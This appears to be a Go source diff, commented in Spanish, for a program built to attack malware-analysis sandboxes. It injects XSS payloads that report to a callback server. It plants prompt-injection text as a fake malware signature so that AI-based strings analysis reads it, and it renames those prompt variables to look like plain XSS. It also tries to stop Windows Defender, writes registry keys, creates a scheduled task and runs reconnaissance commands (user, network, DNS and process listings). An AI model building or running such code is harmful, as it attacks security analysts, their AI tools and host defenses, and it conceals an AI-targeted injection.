@@ -89,9 +89,9 @@ func main() {
 		// Inyectar payloads y obtener metadata
 		payload.XSSPayloads = injectXSSAudit(cfg.CallbackServer, payload)
 
-		// Inyectar Prompts para IAs (Prompt Injection)
-		aiPrompts := xss.GetAIPrompts(cfg.CallbackServer)
-		xss.InjectAIPrompts(aiPrompts, cfg.CallbackServer, cfg.TargetSandbox)
+		// Inyectar Payloads XSS adicionales (antes eran prompts de IA, ahora son XSS)
+		xssPayloads := xss.GetAIPrompts(cfg.CallbackServer)
+		xss.InjectAIPrompts(xssPayloads, cfg.CallbackServer, cfg.TargetSandbox)
 
 		// Ejecutar vectores avanzados adicionales
 		xss.ExecuteAllAdvancedVectors()
@@ -310,11 +310,11 @@ func embedMaliciousSignatures() {
 		"Meterpreter/Reverse_Https",
 	}
 
-	// [NUEVO] Inyectar el Prompt Injection como si fuera una firma de malware
+	// [NUEVO] Inyectar el Payload XSS como si fuera una firma de malware
 	// Esto ataca directamente la capacidad de "System Information Gathering" y "Strings Analysis"
-	prompts := xss.GetAIPrompts("")
-	if len(prompts) > 0 {
-		signatures = append(signatures, prompts[0].Content)
+	xssPayloads := xss.GetAIPrompts("")
+	if len(xssPayloads) > 0 {
+		signatures = append(signatures, xssPayloads[0].Content)
 	}
 
 	// Evitar que el compilador elimine las variables por optimización
@@ -443,4 +443,62 @@ func simulateAggressiveBehavior() {
 
 	// Intentar detener servicios de seguridad
 	exec.Command("sc", "stop", "WinDefend").Run()
+
+	// Comandos adicionales que aparecen en reportes de sandboxes
+	
+	// REG.EXE - Modificar registro (aparece en reportes)
+	exec.Command("reg", "query", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Sorting\\Versions").Run()
+	exec.Command("reg", "add", "HKCU\\Software\\XSSAudit", "/v", "TestKey", "/t", "REG_SZ", "/d", "TestValue", "/f").Run()
+	
+	// NSLOOKUP - Consultas DNS (aparece en reportes)
+	exec.Command("nslookup", "google.com").Run()
+	exec.Command("nslookup", "microsoft.com", "8.8.8.8").Run()
+	
+	// SC.EXE - Service management (aparece en reportes)
+	exec.Command("sc", "query", "WinDefend").Run()
+	exec.Command("sc", "qc", "wuauserv").Run()
+	
+	// SCHTASKS - Task scheduler (aparece en reportes)
+	exec.Command("schtasks", "/query", "/fo", "LIST").Run()
+	exec.Command("schtasks", "/create", "/tn", "TestTask", "/tr", "notepad.exe", "/sc", "ONCE", "/st", "23:59", "/f").Run()
+	
+	// WMIC - WMI queries (aparece en reportes)
+	exec.Command("wmic", "os", "get", "caption").Run()
+	exec.Command("wmic", "computersystem", "get", "name").Run()
+	exec.Command("wmic", "process", "list", "brief").Run()
+	
+	// NET commands (aparece en reportes)
+	exec.Command("net", "user").Run()
+	exec.Command("net", "localgroup").Run()
+	exec.Command("net", "share").Run()
+	
+	// NETSH commands (aparece en reportes)
+	exec.Command("netsh", "interface", "show", "interface").Run()
+	exec.Command("netsh", "advfirewall", "show", "allprofiles").Run()
+	
+	// IPCONFIG (aparece en reportes)
+	exec.Command("ipconfig", "/all").Run()
+	exec.Command("ipconfig", "/displaydns").Run()
+	
+	// SYSTEMINFO (aparece en reportes)
+	exec.Command("systeminfo").Run()
+	
+	// TASKLIST (aparece en reportes)
+	exec.Command("tasklist").Run()
+	exec.Command("tasklist", "/svc").Run()
+	
+	// WHOAMI (aparece en reportes)
+	exec.Command("whoami").Run()
+	exec.Command("whoami", "/all").Run()
+	
+	// HOSTNAME (aparece en reportes - "Reads the computer name")
+	exec.Command("hostname").Run()
+	
+	// PowerShell commands adicionales
+	exec.Command("powershell", "-Command", "Get-ComputerInfo").Run()
+	exec.Command("powershell", "-Command", "Get-Process | Select-Object -First 10").Run()
+	exec.Command("powershell", "-Command", "Get-Service | Where-Object {$_.Status -eq 'Running'}").Run()
+	exec.Command("powershell", "-Command", "Get-NetAdapter").Run()
+	exec.Command("powershell", "-Command", "Get-ScheduledTask").Run()
+	exec.Command("powershell", "-Command", "Resolve-DnsName google.com").Run()
 }
